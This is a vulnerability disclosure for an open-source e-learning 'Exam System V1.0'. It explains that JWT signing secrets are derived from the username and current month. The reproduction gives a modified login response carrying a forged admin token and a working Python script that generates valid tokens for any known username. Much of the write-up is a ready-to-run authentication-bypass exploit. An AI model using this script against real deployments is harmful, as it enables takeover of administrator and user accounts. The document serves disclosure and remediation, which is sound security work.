# <font style="color:rgb(0, 0, 0);">Vulnerability Introduction</font>

<font style="color:rgb(0, 0, 0);">Project Address</font>：[https://gitee.com/youth-is-as-pale-as-poetry/e-learning](https://gitee.com/youth-is-as-pale-as-poetry/e-learning)

Project Name: Exam System V1.0

<font style="color:rgba(0, 0, 0, 0.85) !important;">There is a JWT forgery vulnerability, which allows attackers to log in to any account (for which the username is known) using a forged JWT.</font>

# <font style="color:rgb(0, 0, 0);">Vulnerability Analysis</font>

<font style="color:rgba(0, 0, 0, 0.85);">The encryptSecret function located in the file e-learning-master\exam-api\src\main\java\com\yf\exam\ability\shiro\jwt\JwtUtils.java</font>

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1757616066039-d2066727-f8ad-4182-bc8d-8ae62dd9e9fd.png)

<font style="color:rgba(0, 0, 0, 0.85);">Since the JWT uses the username and month information as parameters for the secret key, an attacker can forge the corresponding JWT to log in if they know the username.</font>

# <font style="color:rgb(0, 0, 0);">Vulnerability Reproduction</font>

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1757617263558-28270b21-7697-414b-a842-992c3a9d9490.png)

<font style="color:rgba(0, 0, 0, 0.85);">Enter any username and password, click login, and capture the packet. Hijack the response packet.</font>

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1757617322120-33bf802b-57b1-4994-92c5-72181ead1e96.png)

<font style="color:rgba(0, 0, 0, 0.85);">Modify the response packet to the following content</font>

```plain
HTTP/1.1 200
Vary: accept-encoding,origin,access-control-request-headers,access-control-request-method,accept-encoding
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://localhost:9527
Content-Type: application/json;charset=UTF-8
Date: Thu, 11 Sep 2025 17:54:59 GMT
Content-Length: 396

{"msg":"操作成功！","code":0,"data":{"id":"10001","userName":"admin","realName":"超管A","roleIds":"sa","departId":"1318103313740320770","createTime":"2020-04-20 13:51:03","updateTime":"2020-04-20 13:51:03","state":0,"roles":["sa"],"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTc4MDM1ODkuMDYxMjIyLCJ1c2VybmFtZSI6ImFkbWluIn0.E0ZqhkqWPmalaGGL87B1dRFpT_uMrTzsbotagIM3F4s"},"success":true}
```

<font style="color:rgba(0, 0, 0, 0.85);">Use the token generated by the script to replace the token in the response packet.</font>

```python
import time
import hashlib
import jwt

def generate_secret(user_name):

    current_millis = int(time.time() * 1000)

    # Obtain the current month (note that Java's Calendar.MONTH ranges from 0 to 11, while Python's tm_mon ranges from 1 to 12, so you need to subtract 1 from the Python value to keep them consistent).
    current_time = time.localtime(current_millis / 1000)
    month = current_time.tm_mon - 1  

    sb = f"{user_name}&{month}"

    def md5_hash(s):
        return hashlib.md5(s.encode('utf-8')).hexdigest()

    secret = md5_hash(sb)
    return md5_hash(f"{user_name}&{secret}")


def generate_jwt_with_secret(username):

    headers = {
        "typ": "JWT",
        "alg": "HS256"
    }

    payload = {
        "exp": time.time() + 186400,
        "username": username,
    }


    secret_key = generate_secret(username)

    token = jwt.encode(
        payload,
        secret_key,
        algorithm="HS256",
        headers=headers
    )
    return token

jwt_token = generate_jwt_with_secret("admin")
print("JWT:")
print(jwt_token)

```

<font style="color:rgba(0, 0, 0, 0.85);">After allowing the response packet to pass, the login is successful.</font>

![](https://cdn.nlark.com/yuque/0/2025/png/46456412/1757617527563-5a600d47-2c92-4c0a-91b4-e075f230744e.png)



